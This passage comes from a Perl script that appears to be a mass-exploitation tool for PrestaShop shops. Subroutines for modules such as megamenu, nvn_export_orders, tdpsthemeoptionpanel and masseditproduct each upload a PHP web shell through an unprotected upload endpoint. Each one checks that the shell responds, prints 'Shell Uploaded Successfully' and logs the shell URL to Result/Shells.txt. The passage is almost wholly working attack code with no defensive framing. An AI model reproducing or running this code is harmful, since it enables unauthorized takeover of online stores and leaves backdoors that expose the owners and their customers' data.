print TEXT "$pk_vertflexmenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";

print color('bold red'),"[FAILED]\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php?X=M0B";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $nvn_export_ordersup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$nvn_export_ordersup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";

print color('bold red'),"[FAILED]\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=l.php";
my $shell ="l.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$megamenuup="$site/l.php.png?X=M0B";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $megamenuup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$megamenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold red'),"[FAILED]\n";
}
}

################ tdpsthemeoptionpanel #####################
sub tdpsthemeoptionpanel(){
my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="l.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/l.php?X=M0B";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $tdpsthemeoptionpanelup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$tdpsthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";

print color('bold red'),"[FAILED]\n";
}
}


################ psmodthemeoptionpanel #####################
sub psmodthemeoptionpanel(){
my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="l.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/l.php?X=M0B";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $psmodthemeoptionpanelup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$psmodthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";

print color('bold red'),"[FAILED]\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="l.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$masseditproductup="$site/masseditproduct/uploads/file/l.php?X=M0B";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/M0B/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";

print color('bold green'),"[VULNERABLE]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $masseditproductup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";

print color('bold red'),"[FAILED]\n";
}
}
}
}
}
}
}
}
